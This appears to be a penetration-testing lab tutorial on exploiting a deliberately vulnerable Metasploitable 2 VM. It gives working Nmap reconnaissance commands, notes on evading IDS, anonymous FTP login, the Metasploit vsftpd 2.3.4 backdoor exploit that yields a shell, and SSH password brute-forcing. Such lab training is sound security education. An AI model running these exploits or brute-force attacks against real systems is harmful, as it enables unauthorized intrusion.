# Server Side Attacks: 
These are the type of attacks which is used to gained unauthorized acess to the system by exploiting the vulnerabilites or misconfiguration of the Software, OS and the services running on the target machine. These attacks do not require any user/client interaction as it mainly focus on vulnerabilites present in the target system. For these type of attacks the target should have on the same network or may have a public ip like servers i.e the target should be reachable from the target machine(Not hidden behind the routers). If the target is not reachable then these type of attacks are failed. For that case try using client side attacks.

## Server Side Attacks includes:
  **Injection Flaws** (e.g., SQL Injection): In this, Attacker sends malicious code to interact with a database, leading to data theft or manipulation.
  
  **Remote Code Execution** (RCE): Exploiting flaws to run custom code on the server.
  
  **Insecure File Upload**: Uploading malicious files that execute code or provide a foothold on the server.
  
  **Server Misconfigurations**: Poor configurations (e.g., weak passwords, default settings) making it easier for attackers to compromise the system by bruteforcing the passwords.

---
# Exploiting the Various Vulerabilities of **Metasploitable 2** Machine :

Metasploitable 2 is a deliberately vulnerable virtual machine used for practicing penetration testing techniques. In this guide will demonstrate how to exploit the various vulnerabilities of the Metasploitable 2 Machine using my Kali Linux Machine. So lets get started:

## Tools Used :
### 1. **Nmap** (Network Mapper)
Nmap is an open-source tool used for network discovery and security auditing. It is widely used to **scan and map networks**, **identify open ports**, **services running on different port**, **Operating system detection**and **discover vulnerabilities**.
The main problem with this tools is that it is quite noisy i.e It can easily detected by the IDS and IPS software and by setting certain rules they can block the nmap scan. But by using different scanning techinques like **Inverse tcp flag Scanning**,**Decoys** and Specifing **Timing Templates** etc can bypass the IDS and IPS rules.
***Some key features include***:

1. **Port Scanning**: Identifies open and closed ports on a network or particular machine.
2. **Service Version Detection**: Determines the version of services running on open ports(like, FTP, SSH).
3. **OS Detection**: Detects the operating system of the target machine.
4. **Scripting Engine**: Nmap also contains the **NSE** nmap scripting Engine that is used to Automates tasks using scripts, such as vulnerability detection, bruteforcing etc. The nmap scripts are present in the /usr/share/nmap/scripts/ directory.
### Nmap is very essential tool for reconnaissance(mainly active scanning)  in penetration testing.
---
  
### 2. **Metasploit Framework**
Metasploit is an open-source penetration testing platform that allows cybersecurity professionals to **find**,**assist** **exploit**, and **validate** different type of vulnerabilities. It contains a vast database of **exploits**, **payloads**, **encoders** and **auxilaries** for different platforms and services. ***Key features include***:

1. **Exploits Database**: A wide collection of exploits for different software vulnerabilities.
2. **Payloads**: A small piece of code that gets executed on the target once the vulnerability is exploited.
3. **Post-Exploitation**: Allows further actions like privilege escalation and data extraction after compromising a system.
4. **Auxiliary Module**: Tools for auxiliary functions like scanning, fingerprinting ,fuzzing, or DoS attacks.

 #### Metasploit helps streamline the exploitation process, making it a go-to tool for vulnerability assessments and Exploitation.

 ---
# Step 1 Enummeration or Reconnasissance

This is the first step in the penetration testing known as Information Gathering step. In this step Gather as much information as you can about the target. It includes find ip addresses, public information about the target, Target OS, various services running on target, open port, its domain and subdomain etc. This phase is very crucial to further carry out in both server side and client side attack.
It was categorised in two categories:

**1. Passive Scanning**: In passive scanning we gather information about the target that is publically available i.e with interacting with the target like the target domain, its subdomain, technology stack etc.

**2. Active Scanning**: In Active scanning we gather information by direclty interacting with the target using tools like nmap to scan for open ports, its running services and its versions etc.

## Lets start by Gathering information about our taget Metasploitable 2:
**As we Know that the target is our local machine in our virtual homelab environment So there is not much public information available about our target. So we skip the passive reconn step and move to the Active Scanning**
**Step 1** Now first as we know that the target machine is inside our homelab network but we don't know the ip address of the target.So firstly start with a Hostscan with nmap over entire network to get the ip address of our target Metasploitable 
```
nmap -sn 192.168.1.100/24
```
Output:
! []
As from the above result we get that our network has 
192.168.1.100 -> opnsense firewall address
192.168.1.101 -> kali machine
then there is **192.168.1.103** -> which is our metasploitable machine
**Step 2** Verrfy that Our client is reachable 
From our Attacker kali machine try to ping our metasploitable machine
```
ping 192.168.1.103
```
**Step 3** As the Host is up and reachable, let do an nmap scan to identify the open ports and its running service along with version detection.
```
nmap -Pn -sV -v 192.168.1.103
```
Pn -> for Directly perform Port scanning as we already verify the host is up and running.

sV -> For service detection along with its version.

v  -> For verbose i.e detail about each step.
**Output**:
! []

---
# Step 2 Identifying Vulnerabilites and Exploit them
In this phase different running services are analyzed against the common vulnerabilites scanning scripts and try to exploit them using diffent exploits and payloads available in the metasploit framework.

## 1. Exploiting Service on port 21: Vsftpd(very secure file transfer protocol deamon) 2.3.4

As from the nmap scan we got that an ftp service is running on port 21 along with its version.
### Identifying Vulnerabilities or Weakness:
```
cd /usr/share/nmap/scripts
#Search for ftp related scripts
ls -al | grep "ftp"
#check for anonymous login allowed or not
nmap -p 21 --script ftp-anon.nse 192.168.1.103
#check for the common backdoor present in vsftp or not
nmap -p 21 --script ftp-vsftpd-backdoor.nse 192.168.1.103
```
**Output**
[]
From the output we can conclude that there are 2 main vulnerability present in the **vsftpd-2.3.4**:
**1. Anonymous login allowed without password.**
**2. A backdoor is present which let us to execute the system command via that backdoor.**

### Exploitation :

**1. Exploiting Anonymous login allowed vulnerability**: This vulnerability allowed to login as anonymous without providing the password to the ftp server of the metasploitable machine.

  For this we just need to have a ftp client that need to connect to the ftp server, you can use the linux **inbuild ftp client** or **filezila**. 
  
  **Using Filezila**:
  
  **Step I**: Open Filezila and put the **host= Metasploitable ip i.e 192.168.1.103** & **username= anonymous** & **password= (left blank)**
  
  **Step II**: Start a quick scan and you get connected to the vsftpd server.
  
  **Using linux ftp-client**:Enter the terminal and run ftp-client by:
  ```
ftp 192.168.1.103
username=anonymous
password=
```
**Output**
[]

**Now we have successfully gained access to the ftp server of our target which has misconfigured ftp service. But with the ftp server of metasploit we can perform that much shell operation as its limited scope of transfering files to the server only.

**2. Exploiting Backdoor commmand Execution Vulnerability**: This version of vsftp-2.3.4 has a inbuild backdoor present in its source code which allows as to execute full system command once we got successfully connected to that backdoor.

1. Firstly search for the exploit available for this vulnerability, by searching **vsftpd-2.3.4 exploit** on google or any search engine.
2. From that we got to know that there is metasploit exploit module that can be used to connect to this backdoor.
3. Now exploit this vulnerability using metasploit vsftp exploit as"
```
#Run the metasploit framework cli using cmd
msfconsole
#search vsftpd backdoor command execution exploit
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
#check for fields
show options
#Set field according to our target
set RHOSTS 192.168.1.103
set RPORT 21
#Run the exploit
exploit
```
** After running the exploit, a shell session is estabilise with the target machine and you execute any linux command on the target machine.**
To get the above script -> ! [here]()


---
## Exploiting Service on Port 22: ssh service(secure shell) Openssh-4.7p1
### Identifying Vulnerabilites or Weakness
 ```
cd /usr/share/nmap/scripts
ls -al | grep ssh
#Check for ssh authentication methods
nmap -p 22 --scripts ssh-auth-methods.nse
#check for algorithm used
nmap -p 22 --scripts ssh2-enum-algo.nse
```
From the output we get that the target machine uses both password and private key based authentication. Also we get info about the algorithm used by the ssh-server like rsa,dss which are quite weak and outdated encryption algorithms.But We can conclude a direct vulnerability from here. Now search for vulnerability in this ssh version(Openssh-4.7p1) on internet, search openssh-4.7 exploit, here we found that it has a **user code execution vulnerability** which allow us to execute command on the remote server after getting an ssh connection with the target server and its corresponding exploit is present in the metasploit exploit db module.

### Exploitation:
To exploit/attack the ssh service i.e to get the ssh connection to the target we have two methods:
1. **Bruteforcing the ssh with username and passwords.**
2. **Using key based authentication.**

**1. Bruteforcing the ssh with username and passwords**:
 As we know the target ssh services allows password based authentication. So we can bruteforce the login attemps using a wordlist. For this we have an auxiliary module in the metasploit framework. Let start the attack
 ```
#Start the metasploit cli
msfconsole
#search for the auxiliar module
search ssh_login
use auxiliary/scanner/ssh/ssh_login
#check for the fields
show options
set RHOST 192.168.1.103
#setting the userpass custom wordlist of metasploit
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlist/userpass.txt
set STOP_ON_SUCESS true
set USER_AS_PASSWORD true
set VERBOSE true
exploit
```
Now this module will brute force the ssh login with the wordlist and if there is a match we get the username and password for that ssh server if it has default password or weak password. If it does get the login parameter use your custom wordlist.
**Output**
[]
In my case I am using metasploitable default login crudential, get the result as **username= msfadmin** and **password= msfadmin**
